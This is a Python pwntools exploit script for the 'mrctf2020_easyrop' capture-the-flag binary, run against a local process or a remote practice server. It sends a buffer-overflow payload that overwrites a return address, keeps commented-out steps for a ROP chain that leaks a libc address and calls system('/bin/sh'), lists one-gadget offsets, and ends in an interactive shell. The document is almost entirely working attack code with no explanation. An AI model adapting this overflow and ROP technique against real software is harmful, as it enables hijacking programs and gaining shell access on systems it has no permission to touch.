#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='./mrctf2020_easyrop'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('node3.buuoj.cn',25965)
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]


		def add(a,b):
			io.sendline(str(a))
			sleep(1)
			io.sendline(b)
			sleep(1)

		add(2,'a'*0x2f0+'\x00')
		pay='a'*0x28+p64(0x40072A)
		# p64(0x0000000000400933)
		# pay+=p64(elf.got['strlen'])+p64(elf.plt['puts'])
		# pay+=p64(0x0000000000400933)+p64(0)
		# pay+=p64(0x0000000000400931)+p64(elf.got['strlen'])
		# pay+=p64(0)+p64(elf.plt['read'])
		# pay+=p64(0x0000000000400620)
		add(7,pay)
		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['strlen']
		# libc.address=libc_base
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# system_addr=libc.sym['system']

		# io.send(p64(system_addr))

		# add(2,'/bin/sh\x00')

		# add(7,'aaa')


		# success('heap_base:'+hex(heap_base))
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue